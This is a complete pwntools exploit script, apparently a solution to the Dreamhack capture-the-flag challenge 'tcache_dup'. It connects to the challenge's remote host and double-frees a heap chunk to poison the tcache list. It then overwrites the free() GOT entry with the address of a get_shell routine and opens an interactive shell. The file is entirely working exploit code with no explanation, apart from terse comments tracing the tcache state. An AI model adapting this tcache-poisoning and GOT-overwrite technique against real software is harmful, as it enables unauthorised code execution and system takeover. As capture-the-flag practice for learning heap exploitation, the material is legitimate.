from pwn import *

context.log_level = 'debug'

p = remote('host3.dreamhack.games', 21848)
# p = process('./tcache_dup')
e = ELF('./tcache_dup')
lib = ELF('./libc-2.27.so')

def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())
    
# DFB tcache -> chunk <- chunk
create(0x30, b'A')
delete(0)
delete(0)

free_got = e.got['free']
create(0x30 , p64(free_got)) # tcache -> chunk A -> free_got
create(0x30 , b'A') # tcache -> free_got
create(0x30 , p64(0x400ab0)) # tcache -> free_got = get_shell

delete(0)


p.interactive()


